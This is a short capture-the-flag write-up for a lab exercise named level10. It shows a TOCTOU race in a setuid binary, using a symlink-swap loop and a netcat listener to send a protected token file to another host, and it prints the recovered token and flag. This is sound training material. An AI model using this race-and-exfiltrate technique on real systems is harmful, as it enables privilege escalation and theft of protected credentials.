# level10

`ls`
![[ls.png]]

![[level10.png]]

In another terminal, `nc -l 6969` to receive a file
`./level10 token localhost`
![[Token error.png]]

With another test we can see that it works with a file we have rights over.

After decompiling with ghidra, we get:
```c
  pcVar6 = (char *)param_2[1];
  iVar2 = access((char *)param_2[1],4);
  if (iVar2 == 0) {
	  ...
  } else {
    printf("You don\'t have access to %s\n",pcVar6);
  }
```

Let's create a race condition so that access sees the correct rights:
`while true; do ln -sf ~/level10 /tmp/pwned; ln -sf ~/token /tmp/pwned; done &`
`while true; do ./level10 /tmp/pwned 10.0.2.15; done &`

![[Binary.png]]
In the middle of the binary, there is the token: `woupa2yuojeeaaed06riuj63c`

`su flag10`
`getflag`
![[getflag10.png]]

### Flag = feulo4b72j7edeahuete3no7c